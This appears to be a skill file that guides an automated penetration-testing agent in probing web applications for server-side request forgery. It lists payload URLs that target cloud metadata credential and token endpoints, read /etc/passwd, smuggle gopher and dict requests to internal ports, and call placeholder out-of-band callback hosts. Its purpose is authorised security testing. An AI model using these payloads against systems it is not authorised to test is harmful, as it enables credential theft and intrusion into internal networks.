---
name: ssrf_testing
description: Server-Side Request Forgery testing with internal and OOB techniques
category: injection
bug_class: ssrf
triggers:
  - ssrf
  - server-side request
  - internal
  - out-of-band
  - oob
---

# SSRF Testing

## Key Insight
SSRF occurs when an application fetches a resource from a user-supplied URL without proper validation. This can lead to internal network access, cloud metadata theft, or RCE.

## Attack Surface
- URL parameters that fetch external resources
- Image/file upload with URL
- Webhook configurations
- PDF generators with URL input
- API endpoints that proxy requests

## Methodology
1. **Identify URL Inputs**: Find all endpoints that accept URLs
2. **Internal Access**: Test access to internal services
3. **Cloud Metadata**: Test cloud provider metadata endpoints
4. **OOB Testing**: Use external callback services
5. **Protocol Smuggling**: Test different URL schemes

## Techniques

### Internal Network Access
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://169.254.169.254  (cloud metadata)
```

### Cloud Metadata
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Protocol Smuggling
```
file:///etc/passwd
gopher://127.0.0.1:25/
dict://127.0.0.1:6379/
```

### OOB (Out-of-Band)
```
http://your-collaborator-id.burpcollaborator.net
http://your-ngrok-url.ngrok.io
```

## Validation
- Check for response differences
- Use OOB callbacks to confirm
- Test with different IP formats
- Check for error messages revealing internal info

## False Positive Avoidance
- Blocked requests are NOT SSRF
- Timeouts alone are NOT proof
- Need OOB callback or response content for confirmation
